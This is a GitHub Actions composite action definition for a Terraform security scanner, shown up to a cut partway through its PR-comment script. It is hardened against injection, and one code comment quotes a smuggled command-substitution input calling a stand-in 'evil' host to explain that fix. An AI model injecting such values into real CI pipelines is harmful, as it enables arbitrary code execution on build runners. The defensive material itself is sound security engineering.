name: 'tf-analyze'
description: 'Static + plan-time Terraform security analysis with attack-graph prioritisation, MITRE mapping, and one-click PR fixes.'
author: 'ChrisAdkin8'

branding:
  icon: 'shield'
  color: 'blue'

inputs:
  target:
    description: 'Path to scan, relative to the workspace.'
    default: '.'
  fail-on:
    description: 'Minimum urgency level that fails the action (CRITICAL, HIGH, MEDIUM, LOW, INFO).'
    default: 'HIGH'
  mode:
    description: 'Execution mode (static, diff, plan, fleet). Auto-selects "diff" on pull_request events when set to "auto". "plan" is a static scan plus the `plan-json` input (required). "fleet" scans every --target / --targets-file passed in `extra-args` as well as `target`. "trend" (a history report with nothing to gate) and "pr-review" (this action already posts the PR review comments, see `post-pr-comment`) are refused: run `detect.py --mode trend` / `--mode pr-review` directly.'
    default: 'auto'
  plan-json:
    description: 'Path, relative to the workspace, to `terraform show -json plan.tfplan` output. Passed as `--plan-json`; required by `mode: plan`, optional with the other modes.'
    default: ''
  section:
    description: 'Restrict to a single catalogue section (security, robustness, ops, …), passed as `--focus`. Empty = all sections.'
    default: ''
  attack-graph:
    description: 'Build the internet → crown-jewels attack graph: promote critical-path findings one urgency tier, and lower findings on network resources the graph shows are unreachable by one tier (never an escalated finding, a resource type the graph does not model such as IAM, or a credential-exposure rule).'
    default: 'true'
  baseline:
    description: 'Path, relative to the workspace, to a prior JSON report. Findings present in the baseline are suppressed; only NEW findings affect the exit code. On pull_request / pull_request_target / merge_group events the baseline is read from the base branch (a PR could otherwise add its own findings to it), unless `trust-pr-config` is `true`; if the base branch has no such file the scan runs without a baseline.'
    default: ''
  post-pr-comment:
    description: 'Post inline `suggestion` blocks for fixable findings on pull_request events. Requires permissions.pull-requests: write.'
    default: 'true'
  upload-sarif:
    description: 'Upload SARIF to GitHub Code Scanning. Requires permissions.security-events: write.'
    default: 'true'
  upload-html-artifact:
    description: 'Upload the HTML report as a workflow artifact (retention 30 days).'
    default: 'true'
  debug-upload-findings:
    description: |
      OPT-IN DEBUG: upload `tf-analyze-findings.json` as a workflow artifact
      (retention 7 days). Off by default because the JSON can be large on
      big repos and most users don't need it. Flip to `true` when
      diagnosing a difference between what the engine reports and what the
      action posts (e.g. zero inline `suggestion` comments when findings
      do exist). Pair with the `core.info(...)` lines the action emits in
      the "Post PR review comments + summary" step for a complete picture
      of which findings reached the inline-suggestion loop. See
      https://github.com/ChrisAdkin8/tf-analyze/issues/19.
    default: 'false'
  image:
    description: 'Docker image to run. Empty (the default) = the engine image matching the ref this action was called at: `uses: ChrisAdkin8/tf-analyze@v1.2.3` runs `ghcr.io/chrisadkin8/tf-analyze:1.2.3` (`@v1.2` -> `:1.2`, `@v1` -> `:1`, a commit SHA -> `:sha-<sha>`). A branch or a local `uses: ./` falls back to `:latest` with a warning. Set to override (e.g. ghcr.io/chrisadkin8/tf-analyze:0.2.3).'
    default: ''
  extra-args:
    description: 'Additional CLI flags appended verbatim to detect.py (e.g. "--check-registry --compliance").'
    default: ''
  compliance-framework:
    description: 'Optional compliance framework for the gap report (cis, pci_dss, soc2, owasp_iac, all). Empty = disabled. When set, the engine runs the compliance gap report and the PR comment gains a collapsible compliance section.'
    default: ''
  trust-pr-config:
    description: |
      On pull_request, pull_request_target and merge_group events the
      scanned files come from the PR, so the PR
      could edit `.tf-analyze.yaml` (ignore_rules / ignore_paths / rules_dir)
      or `.tf-analyze-ignore.yaml` to switch the gate off. By default
      (`false`) the action reads both files, and the custom rules they point
      at, from the PR's base branch instead: settings already merged still
      apply, the PR's changes to them do not. The `baseline` report is
      read from the base branch the same way. An inline `tf-analyze:ignore`
      comment is honoured only if the base branch already has it on the same
      code (`--inline-ignores-from`): one the PR adds does not suppress
      until it is merged. Set `true` to use the PR's own copies and honour
      every inline comment. Other events (push, schedule, …) use the
      checked-out files.
    default: 'false'
  ref:
    description: 'Shorthand for pinning the engine image tag. Accepts both `v0.2.3` (matches GitHub release URLs / CHANGELOG / marketplace listing) and `0.2.3` (matches the docker tag emitted by `docker/metadata-action`); the leading `v` is stripped when followed by a digit. Non-semver refs like `main` or `latest` pass through untouched. Mutually exclusive with an explicit `image:`.'
    default: ''

outputs:
  score:
    description: 'Risk score (0–100). Always populated.'
    value: ${{ steps.scan.outputs.score }}
  grade:
    description: 'Letter grade (A / B / B- / C / D / F).'
    value: ${{ steps.scan.outputs.grade }}
  total-findings:
    description: 'Total findings count.'
    value: ${{ steps.scan.outputs.total }}
  critical-count:
    description: 'CRITICAL findings.'
    value: ${{ steps.scan.outputs.critical }}
  high-count:
    description: 'HIGH findings.'
    value: ${{ steps.scan.outputs.high }}
  json-report-path:
    description: 'Path to tf-analyze-findings.json. The reports are written to a fresh folder under $RUNNER_TEMP, not the workspace (a symlink committed in a PR could otherwise redirect the write); read them through these outputs.'
    value: ${{ steps.scan.outputs.json-report-path }}
  html-report-path:
    description: 'Path to tf-analyze-report.html (under $RUNNER_TEMP, see json-report-path).'
    value: ${{ steps.scan.outputs.html-report-path }}
  sarif-report-path:
    description: 'Path to tf-analyze.sarif (under $RUNNER_TEMP, see json-report-path).'
    value: ${{ steps.scan.outputs.sarif-report-path }}

runs:
  using: 'composite'
  steps:
    - name: Resolve mode
      id: mode
      shell: bash
      # Through `env:`, like every other input: `${{ inputs.mode }}` inside
      # `run:` is pasted into the script before bash parses it, so a caller
      # passing event data into `mode` could inject shell. Unknown modes fail.
      #
      # `mode` is the engine's --mode. `plan` isn't one: it is a static scan
      # of the plan JSON, so it needs `plan-json`. `trend` emits a history
      # table with no findings, so there is nothing for the gate to check.
      env:
        TFA_MODE_IN: ${{ inputs.mode }}
        TFA_EVENT: ${{ github.event_name }}
        TFA_PLAN_JSON: ${{ inputs.plan-json }}
      run: |
        MODE="${TFA_MODE_IN}"
        if [ "$MODE" = "auto" ]; then
          if [ "${TFA_EVENT}" = "pull_request" ]; then
            MODE="diff"
          else
            MODE="static"
          fi
        fi
        case "$MODE" in
          static|diff|fleet) ;;
          plan)
            if [ -z "${TFA_PLAN_JSON}" ]; then
              echo "::error::tf-analyze: mode 'plan' needs the 'plan-json' input (the output of 'terraform show -json plan.tfplan')"
              exit 1
            fi
            MODE="static"
            ;;
          trend)
            echo "::error::tf-analyze: mode 'trend' is a history report with no findings to gate; run 'detect.py --mode trend' outside this action"
            exit 1
            ;;
          pr-review)
            # The engine's pr-review posts with a GITHUB_TOKEN the container
            # never gets, so it always exited 2. This action posts the same
            # inline suggestions itself (post-pr-comment).
            echo "::error::tf-analyze: mode 'pr-review' is not supported by this action; use mode 'diff' (or 'auto') with post-pr-comment: true, which posts the inline suggestions"
            exit 1
            ;;
          *)
            echo "::error::tf-analyze: unknown mode '${MODE}' (static, diff, plan, fleet, auto)"
            exit 1
            ;;
        esac
        echo "mode=$MODE" >> "$GITHUB_OUTPUT"

    # Issue #19 hardening — when --mode diff runs on a PR event, the
    # engine's `_diff.get_diff_files` needs `origin/<base_ref>` reachable
    # from `git rev-parse`. The default `actions/checkout@v4` does a
    # shallow fetch (depth 1) of just the PR head SHA, so the base ref
    # isn't local and the engine silently scans 0 files → 0 findings → 0
    # inline suggestions posted. Pre-fetch the base ref (cheap: ~1 MB
    # shallow) so diff mode actually has a baseline to diff against, and
    # pass an explicit `--diff-base` so the engine doesn't fall through
    # to its `main`/`master` autodetection.
    - name: Ensure diff base is available
      id: diff_base
      if: steps.mode.outputs.mode == 'diff' && github.event_name == 'pull_request'
      shell: bash
      env:
        TFA_BASE_REF: ${{ github.base_ref }}
      run: |
        # If the base ref is already local (caller used `fetch-depth: 0`
        # or explicitly fetched it), skip the fetch — it'd be a no-op
        # anyway and saves a network round-trip on the happy path.
        if git -C "${{ github.workspace }}" rev-parse --verify "origin/${TFA_BASE_REF}" >/dev/null 2>&1; then
          echo "::notice::tf-analyze: --mode diff baseline 'origin/${TFA_BASE_REF}' already local; skipping fetch"
        else
          echo "::notice::tf-analyze: fetching base ref 'origin/${TFA_BASE_REF}' for --mode diff (use 'fetch-depth: 0' on actions/checkout to skip this)"
          if ! git -C "${{ github.workspace }}" fetch --depth=1 origin "${TFA_BASE_REF}" 2>&1; then
            echo "::warning::tf-analyze: could not fetch 'origin/${TFA_BASE_REF}'; --mode diff will likely scan 0 files and post 0 inline suggestions. See https://github.com/ChrisAdkin8/tf-analyze/issues/19"
          fi
        fi
        # Pass the explicit fully-qualified ref to detect.py so the
        # engine doesn't fall back to its (limited) `main`/`master`
        # autodetection on workflows whose target branch is `develop`,
        # `release/*`, etc.
        echo "diff-base=origin/${TFA_BASE_REF}" >> "$GITHUB_OUTPUT"

    # A PR must not be able to switch off the gate that checks it. Copy the
    # base branch's config, ignore file and custom rules into a folder the
    # PR can't touch; the scan mounts it read-only and uses those copies.
    # If the base branch can't be read, fail closed: no project config and
    # no file suppressions.
    - name: Use the base branch's tf-analyze config
      id: trusted
      if: >-
        (github.event_name == 'pull_request' || github.event_name == 'pull_request_target'
         || github.event_name == 'merge_group')
        && inputs.trust-pr-config != 'true'
      shell: bash
      env:
        TFA_TARGET: ${{ inputs.target }}
        TFA_BASELINE: ${{ inputs.baseline }}
        # A merge queue run scans the PR merged onto its target branch.
        TFA_BASE_REF: ${{ github.base_ref || github.event.merge_group.base_ref }}
        TFA_WORKSPACE: ${{ github.workspace }}
      run: |
        DIR="${RUNNER_TEMP}/tf-analyze-trusted"
        rm -rf "$DIR" && mkdir -p "$DIR"
        echo "dir=$DIR" >> "$GITHUB_OUTPUT"
        BRANCH="${TFA_BASE_REF#refs/heads/}"
        # Fetch into a ref of our own: a short name like `origin/main` would
        # resolve to a tag of that name first, and tags can come from a PR.
        BASE="refs/tf-analyze/base"
        cd "$TFA_WORKSPACE"
        # Drop a copy left by an earlier run (a self-hosted runner keeps the
        # workspace): if this fetch fails, nothing stale must stand in for it.
        git update-ref -d "$BASE" >/dev/null 2>&1 || true
        # The engine honours an inline `tf-analyze:ignore` only if this ref
        # has it too. Passed even when the fetch fails: the engine then
        # cannot read the ref and honours no inline ignores (fail closed).
        echo "inline-ref=${BASE}" >> "$GITHUB_OUTPUT"
        if [ -z "$BRANCH" ] || ! git fetch --no-tags --depth=1 origin "+refs/heads/${BRANCH}:${BASE}" >/dev/null 2>&1; then
          echo "::warning::tf-analyze: cannot read base branch '${BRANCH}'; scanning with no project config, no ignore file, no inline ignores${TFA_BASELINE:+ and no baseline}"
          echo "ignore=/trusted/none" >> "$GITHUB_OUTPUT"
          exit 0
        fi
        T="${TFA_TARGET#./}"; T="${T%/}"
        [ "$T" = "." ] && T=""
        PREFIX="${T:+$T/}"
        # Copy one repo path from the base branch; succeeds only if it exists there.
        copy() {
          mkdir -p "$DIR/$(dirname "$1")"
          git show "${BASE}:$1" > "$DIR/$1" 2>/dev/null || { rm -f "$DIR/$1"; return 1; }
        }
        if copy "${PREFIX}.tf-analyze.yaml"; then
          echo "config=/trusted/${PREFIX}.tf-analyze.yaml" >> "$GITHUB_OUTPUT"
          RULES_DIR="$(sed -n 's/^rules_dir:[[:space:]]*//p' "$DIR/${PREFIX}.tf-analyze.yaml" \
            | sed 's/[[:space:]]#.*//; s/^["'"'"']//; s/["'"'"'][[:space:]]*$//; s/[[:space:]]*$//' | head -1)"
          if [ -n "$RULES_DIR" ]; then
            git archive "$BASE" -- "${PREFIX}${RULES_DIR%/}" 2>/dev/null | tar -x -C "$DIR" 2>/dev/null || true
          fi
        fi
        # Same lookup as the engine: the target folder, then its parent.
        IGNORE="/trusted/none"
        if copy "${PREFIX}.tf-analyze-ignore.yaml"; then
          IGNORE="/trusted/${PREFIX}.tf-analyze-ignore.yaml"
        elif [ -n "$T" ]; then
          PARENT="$(dirname "$T")"; [ "$PARENT" = "." ] && PARENT="" || PARENT="$PARENT/"
          copy "${PARENT}.tf-analyze-ignore.yaml" && IGNORE="/trusted/${PARENT}.tf-analyze-ignore.yaml"
        fi
        echo "ignore=$IGNORE" >> "$GITHUB_OUTPUT"
        # The baseline decides which findings are "already known", so the
        # PR's copy could list its own new findings. Use the base branch's;
        # without one, scan with no baseline (every finding counts).
        if [ -n "$TFA_BASELINE" ]; then
          B="${TFA_BASELINE#./}"
          case "/$B/" in
            *"/../"*|//*) B="" ;;  # stay inside the repo
          esac
          if [ -n "$B" ] && copy "$B"; then
            echo "baseline=/trusted/$B" >> "$GITHUB_OUTPUT"
          else
            echo "::warning::tf-analyze: baseline '${TFA_BASELINE}' is not on base branch '${BRANCH}'; scanning without a baseline (set trust-pr-config: true to use the PR's copy)"
          fi
        fi
        echo "::notice::tf-analyze: using .tf-analyze.yaml, .tf-analyze-ignore.yaml${TFA_BASELINE:+, the baseline} and the inline ignores from '${BRANCH}', not from this PR (set trust-pr-config: true to change this)"

    - name: Build detect.py args
      id: args
      shell: bash
      # Round-5 audit fix #1 — move every user-supplied input through
      # `env:` so the value is read at runtime (no GitHub Actions
      # templating into the script source). A malicious caller passing
      # `extra-args: "x $(curl evil) y"` previously had the command
      # substitution evaluated when the bash array literal was parsed;
      # via env it stays a literal string and is split with `read -ra`
      # which does not perform command substitution.
      env:
        TFA_TARGET: ${{ inputs.target }}
        TFA_MODE_OUT: ${{ steps.mode.outputs.mode }}
        TFA_DIFF_BASE: ${{ steps.diff_base.outputs.diff-base }}
        TFA_SECTION: ${{ inputs.section }}
        TFA_ATTACK_GRAPH: ${{ inputs.attack-graph }}
        TFA_BASELINE: ${{ inputs.baseline }}
        TFA_EXTRA_ARGS: ${{ inputs.extra-args }}
        TFA_FAIL_ON: ${{ inputs.fail-on }}
        TFA_COMPLIANCE_FW: ${{ inputs.compliance-framework }}
        TFA_TRUSTED_DIR: ${{ steps.trusted.outputs.dir }}
        TFA_TRUSTED_CONFIG: ${{ steps.trusted.outputs.config }}
        TFA_TRUSTED_IGNORE: ${{ steps.trusted.outputs.ignore }}
        TFA_TRUSTED_BASELINE: ${{ steps.trusted.outputs.baseline }}
        TFA_TRUSTED_INLINE_REF: ${{ steps.trusted.outputs.inline-ref }}
        TFA_PLAN_JSON: ${{ inputs.plan-json }}
      run: |
        ARGS=(--target "/workspace/${TFA_TARGET}" --mode "${TFA_MODE_OUT}")
        # Set only on PRs (see the step above): use the base branch's copies.
        if [ -n "${TFA_TRUSTED_DIR}" ]; then
          if [ -n "${TFA_TRUSTED_CONFIG}" ]; then
            ARGS+=(--config "${TFA_TRUSTED_CONFIG}")
          else
            ARGS+=(--no-project-config)
          fi
          ARGS+=(--ignore-file "${TFA_TRUSTED_IGNORE}")
          # Inline ignores the base branch doesn't already have are not
          # honoured, so the PR can't silence its own findings.
          if [ -n "${TFA_TRUSTED_INLINE_REF}" ]; then
            ARGS+=(--inline-ignores-from "${TFA_TRUSTED_INLINE_REF}")
          fi
        fi
        # Issue #19 hardening — when the "Ensure diff base is available"
        # step ran (PR event + mode=diff), it set `diff-base` to the
        # explicit `origin/<base_ref>` ref. Pass it through so the engine
        # doesn't fall back to its `main`/`master` autodetection.
        if [ -n "${TFA_DIFF_BASE}" ]; then
          ARGS+=(--diff-base "${TFA_DIFF_BASE}")
        fi
        if [ -n "${TFA_SECTION}" ]; then
          ARGS+=(--focus "${TFA_SECTION}")
        fi
        if [ -n "${TFA_PLAN_JSON}" ]; then
          ARGS+=(--plan-json "/workspace/${TFA_PLAN_JSON}")
        fi
        if [ "${TFA_ATTACK_GRAPH}" = "true" ]; then
          ARGS+=(--attack-graph)
        fi
        if [ -n "${TFA_BASELINE}" ]; then
          if [ -z "${TFA_TRUSTED_DIR}" ]; then
            ARGS+=(--baseline "/workspace/${TFA_BASELINE}")
          elif [ -n "${TFA_TRUSTED_BASELINE}" ]; then
            # A PR: the base branch's copy (see the step above).
            ARGS+=(--baseline "${TFA_TRUSTED_BASELINE}")
          fi
          # Else a PR whose base branch has no baseline: none (warned above).
        fi
        if [ -n "${TFA_COMPLIANCE_FW}" ]; then
          ARGS+=(--compliance --compliance-framework "${TFA_COMPLIANCE_FW}")
        fi
        if [ -n "${TFA_EXTRA_ARGS}" ]; then
          # `read -ra` does whitespace tokenisation but no command
          # substitution. Same array effect as before, without the
          # injection surface.
          read -ra EXTRA <<<"${TFA_EXTRA_ARGS}"
          ARGS+=("${EXTRA[@]}")
        fi
        printf '%s\n' "${ARGS[@]}" > /tmp/tf-analyze-base-args
        echo "fail-on=${TFA_FAIL_ON}" >> "$GITHUB_OUTPUT"

    - name: Validate compliance-framework
      if: inputs.compliance-framework != ''
      shell: bash
      env:
        TFA_COMPLIANCE_FW: ${{ inputs.compliance-framework }}
      run: |
        case "${TFA_COMPLIANCE_FW}" in
          cis|pci_dss|soc2|owasp_iac|all) ;;
          *)
            echo "::error::tf-analyze: compliance-framework must be one of cis, pci_dss, soc2, owasp_iac, all (got '${TFA_COMPLIANCE_FW}')"
            exit 1
            ;;
        esac

    - name: Resolve image
      id: resolve_image
      shell: bash
      # Order: explicit `image:`; explicit `ref:`; else the ref this action
      # was called at (`github.action_ref`), so pinning
      # `uses: ChrisAdkin8/tf-analyze@v1.2.3` pins the engine too — the old
      # `:latest` default ran whatever `main` last built for everyone,
      # pinned or not. A tag derived from the action ref may not exist
      # (a release older than the sha-/major- image tags); the pull step
      # then falls back to `:latest` with a warning (`derived=true`).
      #
      # `ref` is a convenience alias for the image tag — `ref: v0.2.3`
      # is equivalent to `image: ghcr.io/chrisadkin8/tf-analyze:0.2.3`.
      # We fail loudly when both are set explicitly because they're two
      # signals fighting over the same field; better to surface the
      # ambiguity than pick one silently.
      #
      # R31.6: strip a leading `v` when it's followed by a digit so that
      # `ref: v0.2.3` (the form users see in release URLs, the CHANGELOG,
      # the tag list, and the marketplace listing) works the same as
      # `ref: 0.2.3` (the form `docker/metadata-action` emits by default
      # for semver tags). Non-semver refs like `main` or `latest` pass
      # through untouched. The `^v[0-9]` guard means a hypothetical
      # `ref: vault` would not get truncated to `ault`.
      env:
        TFA_REF: ${{ inputs.ref }}
        TFA_IMAGE: ${{ inputs.image }}
        TFA_ACTION_REF: ${{ github.action_ref }}
      run: |
        REPO_IMAGE="ghcr.io/chrisadkin8/tf-analyze"
        DERIVED=false
        if [ -n "${TFA_REF}" ] && [ -n "${TFA_IMAGE}" ]; then
          echo "::error::tf-analyze: 'ref' and 'image' are mutually exclusive — set one, not both."
          exit 1
        fi
        if [ -n "${TFA_IMAGE}" ]; then
          RESOLVED="${TFA_IMAGE}"
        elif [ -n "${TFA_REF}" ]; then
          if [[ "${TFA_REF}" =~ ^v[0-9] ]]; then
            TAG="${TFA_REF#v}"
          else
            TAG="${TFA_REF}"
          fi
          RESOLVED="${REPO_IMAGE}:${TAG}"
        elif [[ "${TFA_ACTION_REF}" =~ ^v?[0-9]+(\.[0-9]+){0,2}$ ]]; then
          RESOLVED="${REPO_IMAGE}:${TFA_ACTION_REF#v}"
          DERIVED=true
        elif [[ "${TFA_ACTION_REF}" =~ ^[0-9a-f]{40}$ ]]; then
          RESOLVED="${REPO_IMAGE}:sha-${TFA_ACTION_REF}"
          DERIVED=true
        else
          RESOLVED="${REPO_IMAGE}:latest"
          echo "::warning::tf-analyze: action ref '${TFA_ACTION_REF:-local}' is not a release tag or commit SHA, so the engine is the unpinned ':latest' image. Pin the action (uses: ChrisAdkin8/tf-analyze@vX.Y.Z) or set 'ref:' / 'image:'."
        fi
        echo "image=${RESOLVED}" >> "$GITHUB_OUTPUT"
        echo "derived=${DERIVED}" >> "$GITHUB_OUTPUT"

    - name: Pull tf-analyze image
      id: pull_image
      shell: bash
      # An image already present locally (e.g. built from the checkout by
      # the dogfood workflow) is used as is. A tag derived from the action
      # ref that was never published falls back to `:latest` with a
      # warning instead of failing the job; an explicit `image:` / `ref:`
      # that cannot be pulled still fails.
      env:
        TFA_IMAGE: ${{ steps.resolve_image.outputs.image }}
        TFA_DERIVED: ${{ steps.resolve_image.outputs.derived }}
      run: |
        IMAGE="${TFA_IMAGE}"
        if ! docker image inspect "${IMAGE}" >/dev/null 2>&1; then
          if ! docker pull "${IMAGE}"; then
            if [ "${TFA_DERIVED}" != "true" ]; then
              echo "::error::tf-analyze: cannot pull ${IMAGE}"
              exit 1
            fi
            echo "::warning::tf-analyze: no published engine image ${IMAGE} for this action ref; falling back to ':latest'. Set 'ref:' or 'image:' to pin the engine."
            IMAGE="ghcr.io/chrisadkin8/tf-analyze:latest"
            docker pull "${IMAGE}"
          fi
        fi
        echo "image=${IMAGE}" >> "$GITHUB_OUTPUT"

    - name: Run tf-analyze (JSON)
      id: scan
      shell: bash
      env:
        TFA_IMAGE: ${{ steps.pull_image.outputs.image }}
        TFA_TRUSTED_DIR: ${{ steps.trusted.outputs.dir }}
      run: |
        MOUNTS=(-v "${{ github.workspace }}:/workspace")
        if [ -n "${TFA_TRUSTED_DIR}" ]; then
          MOUNTS+=(-v "${TFA_TRUSTED_DIR}:/trusted:ro")
        fi
        # The engine runs git on /workspace (diff mode, --inline-ignores-from)
        # as uid 1001. On a runner whose checkout belongs to another uid, git
        # refuses a repository it doesn't own ("dubious ownership"); mark the
        # mount safe. Should git still fail, the engine fails closed.
        # Pin the repository to the checkout's own .git: git otherwise
        # searches up from the scan target, where a PR could plant a bare
        # repo (its own "base" blobs, and config that runs commands). The
        # engine checks git agrees with the pin, else trusts nothing.
        GIT_ENV=(-e GIT_CONFIG_COUNT=1 -e GIT_CONFIG_KEY_0=safe.directory -e GIT_CONFIG_VALUE_0=/workspace
                 -e GIT_DIR=/workspace/.git -e GIT_WORK_TREE=/workspace)
        BASE_ARGS=()
        while IFS= read -r line; do BASE_ARGS+=("$line"); done < /tmp/tf-analyze-base-args
        # Round-5 audit fix #12 — capture each scan's exit code
        # individually. The prior `|| true` chain made a CRITICAL
        # crash (OOM, segfault, signal 9) indistinguishable from "scan
        # ran successfully, found findings". Exit 0 = clean; exit 1 =
        # findings present (both valid). Exit ≥ 2 means the engine
        # itself died — surface that as an `::error::` annotation so
        # the workflow status reflects reality.
        # Reports and stderr go to a fresh folder under $RUNNER_TEMP, never
        # the workspace: the workspace is the PR's checkout, and a symlink
        # committed as e.g. `tf-analyze.sarif` would send the `>` write to
        # wherever it points. mktemp -d makes a new, empty, private folder.
        OUT="$(mktemp -d "${RUNNER_TEMP:-/tmp}/tf-analyze-out.XXXXXX")"
        echo "out-dir=${OUT}" >> "$GITHUB_OUTPUT"
        echo "json-report-path=${OUT}/tf-analyze-findings.json" >> "$GITHUB_OUTPUT"
        echo "html-report-path=${OUT}/tf-analyze-report.html" >> "$GITHUB_OUTPUT"
        echo "sarif-report-path=${OUT}/tf-analyze.sarif" >> "$GITHUB_OUTPUT"
        echo "pr-summary-path=${OUT}/tf-analyze-pr-summary.md" >> "$GITHUB_OUTPUT"
        run_scan() {
          local fmt="$1" out="$OUT/$2" err="$OUT/$3"
          # GitHub runs `shell: bash` with -e: a bare non-zero `docker run`
          # (exit 1 = findings under a --fail-on in extra-args, exit 2 = a
          # crash) would end the step here, skipping the annotation, the
          # other formats and the outputs. Catch the code instead.
          local rc=0
          docker run --rm "${MOUNTS[@]}" "${GIT_ENV[@]}" \
            "${TFA_IMAGE}" \
            "${BASE_ARGS[@]}" --format "$fmt" --cache --cache-file /tmp/tf-analyze-cache.json \
            > "$out" 2>"$err" || rc=$?
          # The gate step needs the JSON scan's own verdict: a gate passed
          # in extra-args (--fail-on, --fail-on-parse-error, ...) exits 1
          # with a report the gate's own rebuild would pass.
          if [ "$fmt" = "json" ]; then
            echo "json-rc=$rc" >> "$GITHUB_OUTPUT"
          fi
          if [ "$rc" -ge 2 ]; then
            echo "::error::tf-analyze: $fmt scan crashed (exit $rc). See $3 in the log below for the engine traceback."
          fi
          # We still allow the workflow to continue; the json-load
          # step has a try/except (round-3 fix #5) that emits zeroed
          # defaults so downstream steps run with a clear signal.
          return 0
        }
        run_scan json    tf-analyze-findings.json   tf-analyze-json-stderr.txt
        run_scan sarif   tf-analyze.sarif           tf-analyze-sarif-stderr.txt
        run_scan html    tf-analyze-report.html     tf-analyze-html-stderr.txt
        # `pr-summary` is a Markdown shape sized for the GitHub PR
        # comment body. Generated separately so the github-script step
        # can use it verbatim — keeps the rendered shape in the engine
        # rather than duplicating it in JS here.
        run_scan pr-summary tf-analyze-pr-summary.md tf-analyze-pr-summary-stderr.txt
        # The engine's stderr names repo files, and a PR controls those names:
        # a path holding a newline could start a log line with `::error::`,
        # `::add-mask::` or `::stop-commands::` and forge annotations or hide
        # later output. Stop command processing while it prints, under a token
        # nobody can guess.
        LOG_TOKEN="tfa-$(od -An -N16 -tx1 /dev/urandom | tr -d ' \n')"
        for f in tf-analyze-json-stderr.txt tf-analyze-sarif-stderr.txt tf-analyze-html-stderr.txt tf-analyze-pr-summary-stderr.txt; do
          if [ -s "$OUT/$f" ]; then
            echo "::group::$f"
            echo "::stop-commands::${LOG_TOKEN}"
            cat "$OUT/$f"
            echo "::${LOG_TOKEN}::"
            echo "::endgroup::"
          fi
        done

        # Surface the score + counts as outputs.
        # Round-3 audit fix #5 — wrap the JSON load in try/except so a
        # crashed engine (empty or partial tf-analyze-findings.json)
        # surfaces a clear error message in the Action log instead of
        # an untruncated Python traceback. The PR-comment step that
        # consumes these outputs (downstream) then sees zeroed
        # defaults rather than an undefined `findings` list.
        TFA_JSON="$OUT/tf-analyze-findings.json" python3 - <<'PY' >> "$GITHUB_OUTPUT"
        import json, os, sys
        path = os.environ["TFA_JSON"]
        try:
            with open(path) as fh:
                d = json.load(fh)
        except (OSError, json.JSONDecodeError) as e:
            sys.stderr.write(
                f"::error::tf-analyze-findings.json is missing or malformed ({e}); "
                f"the engine likely crashed before emitting JSON. "
                f"Check the previous step's stderr for the real cause.\n"
            )
            # Fall back to zeroed outputs so downstream steps (PR
            # comment, SARIF upload) can still run with safe defaults
            # instead of failing on an undefined variable.
            d = {"summary": {}, "findings": []}
        if not isinstance(d, dict):
            d = {"summary": {}, "findings": []}
        if "by_target" in d:
            # --mode fleet: findings per target; `summary` maps target -> count.
            f = [x for fs in d["by_target"].values() for x in fs]
            s = {}
            c = {}
            for x in f:
                c[x.get("urgency", "")] = c.get(x.get("urgency", ""), 0) + 1
        else:
            s = d.get("summary", {})
            c = s.get("counts", {})
            f = d.get("findings", [])
        print(f"score={s.get('score', 0)}")
        print(f"grade={s.get('grade', '?')}")
        print(f"total={len(f)}")
        print(f"critical={c.get('CRITICAL', 0)}")
        print(f"high={c.get('HIGH', 0)}")
        # Inline ignores the base branch didn't vouch for (counts only: the
        # file names come from the PR and must not reach a workflow command).
        if isinstance(s, dict):
            if s.get("inline_ignores_untrusted"):
                sys.stderr.write(
                    "::warning::tf-analyze: could not read the base branch in the "
                    "scan, so no inline tf-analyze:ignore comments were honoured\n"
                )
            dropped = s.get("inline_ignores_dropped")
            if isinstance(dropped, list) and dropped:
                sys.stderr.write(
                    f"::notice::tf-analyze: {len(dropped)} inline tf-analyze:ignore "
                    f"comment(s) not on the base branch were not honoured; they "
                    f"take effect once merged\n"
                )
        PY

    - name: Upload SARIF to Code Scanning
      if: always() && inputs.upload-sarif == 'true' && steps.scan.outputs.out-dir != ''
      continue-on-error: true
      uses: github/codeql-action/upload-sarif@9b3254085494b55a0f7c4c2b3d2d52cc712ce370 # v4.39.1
      with:
        sarif_file: ${{ steps.scan.outputs.sarif-report-path }}
        category: tf-analyze

    - name: Upload HTML artifact
      if: always() && inputs.upload-html-artifact == 'true' && steps.scan.outputs.out-dir != ''
      uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
      with:
        name: tf-analyze-report
        path: ${{ steps.scan.outputs.html-report-path }}
        retention-days: 30

    # Off-by-default companion to the HTML artifact. Uploads the raw
    # `tf-analyze-findings.json` the engine produced so an out-of-band
    # debugger (or future-you) can see exactly what the inline-suggestion
    # step *read*, not just what it *posted*. Filed against issue #19 where
    # a v0.2.4 → v0.2.5 inline-comment-count regression couldn't be
    # diagnosed without re-running the engine locally — the HTML artifact
    # alone doesn't carry the finding objects' `line` / `file` / `fix_hcl`
    # fields the action consumes.
    - name: Upload findings.json artifact (debug)
      if: always() && inputs.debug-upload-findings == 'true' && steps.scan.outputs.out-dir != ''
      uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
      with:
        name: tf-analyze-findings-json
        path: ${{ steps.scan.outputs.json-report-path }}
        retention-days: 7

    - name: Post PR review comments + summary
      if: >
        always() &&
        inputs.post-pr-comment == 'true' &&
        github.event_name == 'pull_request'
      continue-on-error: true
      uses: actions/github-script@f28e40c7f34bde8b3046d885e986cb6290c5673b # v7.1.0
      env:
        TFA_JSON_REPORT: ${{ steps.scan.outputs.json-report-path }}
        TFA_PR_SUMMARY: ${{ steps.scan.outputs.pr-summary-path }}
      with:
        script: |
          const fs = require('fs');
          let data = {};
          try {
            data = JSON.parse(fs.readFileSync(process.env.TFA_JSON_REPORT, 'utf8'));
          } catch (e) {
            core.warning('Could not read tf-analyze-findings.json: ' + e.message);
            return;
          }
          // --mode fleet reports findings per target, under `by_target`.
          const findings = data.by_target
            ? Object.values(data.by_target).flat()
            : (data.findings || []);
          const summary = data.summary || {};
          const counts = summary.counts || {};

          // Score banner — shown even on a clean repo.
          const grade = summary.grade || '?';
          const gradeBg = { A: '#1e7e34', B: '#5d8e2d', 'B-': '#7a8a2d',
                           C: '#b07d00', D: '#a53f0d', F: '#a02020' }[grade] || '#444';

          // Inline `suggestion` blocks per finding (one per file:line, highest urgency wins).
          const changed = await github.rest.pulls.listFiles({
            owner: context.repo.owner, repo: context.repo.repo,
            pull_number: context.payload.pull_request.number,
          });
          const changedPaths = new Set(changed.data.map(f => f.filename));
          const rank = u => ({ CRITICAL:4, HIGH:3, MEDIUM:2, LOW:1, INFO:0 }[u] ?? 0);
